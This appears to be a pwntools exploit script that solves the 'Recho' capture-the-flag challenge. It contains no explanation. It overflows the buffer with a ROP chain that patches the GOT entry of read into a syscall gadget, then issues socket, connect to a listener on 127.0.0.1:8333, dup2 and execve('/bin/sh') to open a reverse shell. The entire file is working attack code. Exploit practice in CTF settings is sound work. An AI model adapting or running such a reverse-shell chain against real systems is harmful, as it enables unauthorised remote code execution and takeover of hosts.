from pwn import *
import socket

context.arch = 'amd64'

my_port1 = 8333
my_ip = '127.0.0.1'

ret = 0x00000000004005b6# : ret
prax = 0x00000000004006fc# : pop rax ; ret
prdi = 0x00000000004008a3# : pop rdi ; ret
prdx = 0x00000000004006fe# : pop rdx ; ret
prsip = 0x00000000004008a1# : pop rsi ; pop r15 ; ret
gadget = 0x000000000040070d# : add byte ptr [rdi], al ; ret
syscall = 0x00000000000F62F5# : syscall ; ret
buf = 0x0000000000601068
buf2 = buf+8


e = ELF('./Recho')
server = process(['nc', '-lvp', str(my_port1)])
r = process(['./ld-2.23.so', './Recho'], env={'LD_LIBRARY_PATH': '.'})

def send(content):
    r.sendline(str(len(content)+0x100))
    r.send(content)
def add_at(rop, addr, byte):
    rop += [prdi, addr]
    rop += [prax, byte]
    rop += [gadget]

rop = []

# change read -> syscall; ret
add_at(rop, e.got['read'], 133)
add_at(rop, e.got['read']+1, 252)

# socket(2, 1, 6)
rop += [prdi, 2]
rop += [prsip, 1, 0]
rop += [prdx, 6]
rop += [prax, 41]
rop += [e.plt['read']]

# prepare uservaddr
uservaddr = p32(socket.htons(my_port1)<<16|2) +socket.inet_aton(my_ip)
for i in range(len(uservaddr)):
    add_at(rop, buf+i, ord(uservaddr[i]))

# connect(3, uservaddr, 16)
rop += [prdi, 3]
rop += [prsip, buf, 0]
rop += [prdx, 16]
rop += [prax, 42]
rop += [e.plt['read']]

# dup2(3, 1)
rop += [prdi, 3]
rop += [prsip, 1, 0]
rop += [prax, 33]
rop += [e.plt['read']]

# dup2(3, 0)
rop += [prdi, 3]
rop += [prsip, 0, 0]
rop += [prax, 33]
rop += [e.plt['read']]

# read(0, buf2, 8)
rop += [prdi, 0]
rop += [prsip, buf2, 0]
rop += [prdx, 8]
rop += [prax, 0]
rop += [e.plt['read']]

# execve('/bin/sh', 0, 0)
rop += [prdi, buf2]
rop += [prsip, 0, 0]
rop += [prdx, 0]
rop += [prax, 0x3b]
rop += [ret]
rop += [e.plt['read']]

server.send('/bin/sh\x00')
send('A'*0x38+flat(rop))
r.stdin.close()

server.clean()
server.interactive()
